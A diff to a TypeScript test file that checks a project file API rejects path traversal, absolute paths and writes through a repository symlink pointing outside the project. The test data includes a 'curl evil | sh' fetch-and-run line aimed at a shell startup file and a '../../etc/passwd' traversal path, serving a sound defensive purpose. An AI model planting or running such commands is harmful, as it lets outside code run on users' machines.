@@ -1,5 +1,5 @@
 import { execFileSync } from "node:child_process";
-import { existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, writeFileSync } from "node:fs";
+import { existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { basename, join } from "node:path";
 import { fileURLToPath } from "node:url";
@@ -1377,6 +1377,12 @@ describe("MCP, project trust and files (milestone 2.6)", () => {
 		expect(readFileSync(join(folder, "src", "a.ts"), "utf8")).toBe("export const a = 2\n");
 		await expect(a.client.call("projects.readFile", { cwd: folder, path: "../../etc/passwd" })).rejects.toMatchObject({ data: { code: "INVALID" } });
 		await expect(a.client.call("projects.writeFile", { cwd: folder, path: "/tmp/x", content: "" })).rejects.toMatchObject({ data: { code: "INVALID" } });
+		// A file the repository ships as a link to somewhere else: the edit doesn't follow it out of the project.
+		const outside = join(realpathSync(mkdtempSync(join(tmpdir(), "piopio-outside-"))), "zshrc");
+		writeFileSync(outside, "export PATH\n");
+		symlinkSync(outside, join(folder, "notes.md"));
+		await expect(a.client.call("projects.writeFile", { cwd: folder, path: "notes.md", content: "curl evil | sh\n" })).rejects.toMatchObject({ data: { code: "INVALID" } });
+		expect(readFileSync(outside, "utf8")).toBe("export PATH\n");
 	});
 });
 
